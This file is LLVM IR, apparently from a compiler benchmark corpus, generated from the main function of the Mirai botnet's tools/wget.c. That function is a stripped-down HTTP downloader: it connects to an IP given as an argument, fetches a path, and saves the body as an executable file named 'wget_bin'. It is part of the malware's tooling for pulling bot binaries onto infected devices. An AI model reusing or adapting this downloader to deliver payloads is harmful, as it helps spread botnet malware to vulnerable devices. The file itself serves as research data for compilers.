; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/tools/extr_wget.c_main.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/tools/extr_wget.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }

@STDOUT = common dso_local global i32 0, align 4
@EXEC_MSG = common dso_local global i8* null, align 8
@EXEC_MSG_LEN = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"wget_bin\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c" HTTP/1.1\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"Host: \00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@DOWNLOAD_MSG = common dso_local global i8* null, align 8
@DOWNLOAD_MSG_LEN = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [128 x i8], align 16
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %14 = load i32, i32* @STDOUT, align 4
  %15 = load i8*, i8** @EXEC_MSG, align 8
  %16 = load i32, i32* @EXEC_MSG_LEN, align 4
  %17 = call i32 @write(i32 %14, i8* %15, i32 %16)
  %18 = load i32, i32* @AF_INET, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %18, i32* %19, align 4
  %20 = call i32 @HTONS(i32 80)
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %20, i32* %21, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @inet_addr(i8* %24)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = load i32, i32* @O_WRONLY, align 4
  %29 = load i32, i32* @O_CREAT, align 4
  %30 = or i32 %28, %29
  %31 = load i32, i32* @O_TRUNC, align 4
  %32 = or i32 %30, %31
  %33 = call i32 @open(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i32 %32, i32 511)
  store i32 %33, i32* %9, align 4
  %34 = load i32, i32* @AF_INET, align 4
  %35 = load i32, i32* @SOCK_STREAM, align 4
  %36 = call i32 @socket(i32 %34, i32 %35, i32 0)
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %42, label %39

39:                                               ; preds = %2
  %40 = load i32, i32* %9, align 4
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %44

42:                                               ; preds = %39, %2
  %43 = call i32 @__exit(i32 1)
  br label %44

44:                                               ; preds = %42, %39
  %45 = load i32, i32* %8, align 4
  %46 = call i32 @connect(i32 %45, %struct.sockaddr_in* %7, i32 12)
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %50

48:                                               ; preds = %44
  %49 = call i32 @__exit(i32 2)
  br label %50

50:                                               ; preds = %48, %44
  %51 = load i32, i32* %8, align 4
  %52 = call i32 @write(i32 %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32 4)
  %53 = load i32, i32* %8, align 4
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 2
  %56 = load i8*, i8** %55, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = call i32 @write(i32 %53, i8* %56, i32 %60)
  %62 = load i32, i32* %8, align 4
  %63 = call i32 @write(i32 %62, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32 11)
  %64 = load i32, i32* %8, align 4
  %65 = call i32 @write(i32 %64, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32 6)
  %66 = load i32, i32* %8, align 4
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 3
  %69 = load i8*, i8** %68, align 8
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 3
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @strlen(i8* %72)
  %74 = call i32 @write(i32 %66, i8* %69, i32 %73)
  %75 = load i32, i32* %8, align 4
  %76 = call i32 @write(i32 %75, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0), i32 23)
  br label %77

77:                                               ; preds = %87, %50
  %78 = load i32, i32* %10, align 4
  %79 = icmp ne i32 %78, 218762506
  br i1 %79, label %80, label %93

80:                                               ; preds = %77
  %81 = load i32, i32* %8, align 4
  %82 = call i32 @read(i32 %81, i8* %11, i32 1)
  store i32 %82, i32* %12, align 4
  %83 = load i32, i32* %12, align 4
  %84 = icmp ne i32 %83, 1
  br i1 %84, label %85, label %87

85:                                               ; preds = %80
  %86 = call i32 @__exit(i32 4)
  br label %87

87:                                               ; preds = %85, %80
  %88 = load i32, i32* %10, align 4
  %89 = shl i32 %88, 8
  %90 = load i8, i8* %11, align 1
  %91 = sext i8 %90 to i32
  %92 = or i32 %89, %91
  store i32 %92, i32* %10, align 4
  br label %77

93:                                               ; preds = %77
  br label %94

94:                                               ; preds = %93, %101
  %95 = load i32, i32* %8, align 4
  %96 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %97 = call i32 @read(i32 %95, i8* %96, i32 128)
  store i32 %97, i32* %13, align 4
  %98 = load i32, i32* %13, align 4
  %99 = icmp sle i32 %98, 0
  br i1 %99, label %100, label %101

100:                                              ; preds = %94
  br label %106

101:                                              ; preds = %94
  %102 = load i32, i32* %9, align 4
  %103 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %104 = load i32, i32* %13, align 4
  %105 = call i32 @write(i32 %102, i8* %103, i32 %104)
  br label %94

106:                                              ; preds = %100
  %107 = load i32, i32* %8, align 4
  %108 = call i32 @close(i32 %107)
  %109 = load i32, i32* %9, align 4
  %110 = call i32 @close(i32 %109)
  %111 = load i32, i32* @STDOUT, align 4
  %112 = load i8*, i8** @DOWNLOAD_MSG, align 8
  %113 = load i32, i32* @DOWNLOAD_MSG_LEN, align 4
  %114 = call i32 @write(i32 %111, i8* %112, i32 %113)
  %115 = call i32 @__exit(i32 5)
  %116 = load i32, i32* %3, align 4
  ret i32 %116
}

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @HTONS(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @__exit(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr_in*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
